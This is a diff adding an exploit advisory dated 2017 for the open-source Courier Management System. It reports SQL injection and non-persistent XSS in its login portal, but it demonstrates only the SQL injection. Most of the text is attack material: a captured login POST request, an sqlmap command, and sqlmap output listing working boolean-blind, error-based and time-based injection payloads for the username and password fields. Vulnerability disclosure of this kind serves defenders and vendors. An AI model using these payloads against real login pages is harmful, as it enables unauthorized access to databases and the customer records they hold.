@@ -1,0 +1,67 @@
+# Title : Courier Management System - Sql Injection and non-persistent XSS login portal
+# Date: 17 January 2017
+# Exploit Author: Sibusiso Sishi sibusiso@ironsky.co.za
+# Tested on: Windows7 x32
+# Vendor: http://couriermanageme.sourceforge.net/
+# Version: not supplied
+# Download Software: https://sourceforge.net/projects/couriermanageme/files/
+ 
+#################################################
+
+## About The Product : ##
+Courier Management System is the simplest solution for Courier & Cargo Tracking Business. If you need to enable Tracking Option in your existing or new website, this is quickest Software Solution.You can get install it yourselves or We do the installation and brand it in your name on your hosting.The Courier Software is Very easy to setup and manage powerful administration. Provide online tracking system of consignment and shipping detail for International or domestic shipping
+
+## Vulnerability : ## 
+The login portal is vulnerable to SQLi and cross-site scripting attacks
+
+-HTTP Method : POST
+
+POST /cms/login.php HTTP/1.1
+Host: 192.168.19.135
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.19.135/cms/login.php
+Cookie: PHPSESSID=q446r5fqav1qlljb7cohd29r85
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 84
+
+txtusername=test&txtpassword=test&OfficeName=Fast+Courier+-+Jalgaon&Submit=Login+Now
+
+- Sqlmap command: sqlmap -r exploit.txt
+
+- Sqlmap Output : 
+ sqlmap identified the following injection point(s) with a total of 824 HTTP(s) requests:
+---
+Parameter: txtpassword (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)
+    Payload: txtusername=test&txtpassword=test' OR NOT 5887=5887#&OfficeName=Fast Courier - Jalgaon&Submit=Login Now
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: txtusername=test&txtpassword=test' AND (SELECT 9962 FROM(SELECT COUNT(*),CONCAT(0x71766a6b71,(SELECT (ELT(9962=9962,1))),0x717a6b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- CqJl&OfficeName=Fast Courier - Jalgaon&Submit=Login Now
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: txtusername=test&txtpassword=test' OR SLEEP(5)-- VMai&OfficeName=Fast Courier - Jalgaon&Submit=Login Now
+
+Parameter: txtusername (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: txtusername=test' RLIKE (SELECT (CASE WHEN (9742=9742) THEN 0x74657374 ELSE 0x28 END))-- FJke&txtpassword=test&OfficeName=Fast Courier - Jalgaon&Submit=Login Now
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: txtusername=test' AND (SELECT 6984 FROM(SELECT COUNT(*),CONCAT(0x71766a6b71,(SELECT (ELT(6984=6984,1))),0x717a6b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- nDYx&txtpassword=test&OfficeName=Fast Courier - Jalgaon&Submit=Login Now
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: txtusername=test' AND (SELECT * FROM (SELECT(SLEEP(5)))Aols)-- LarG&txtpassword=test&OfficeName=Fast Courier - Jalgaon&Submit=Login Now
+---
+[16:59:17] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows
+web application technology: Apache 2.4.23, PHP 5.6.24
+back-end DBMS: MySQL >= 5.0
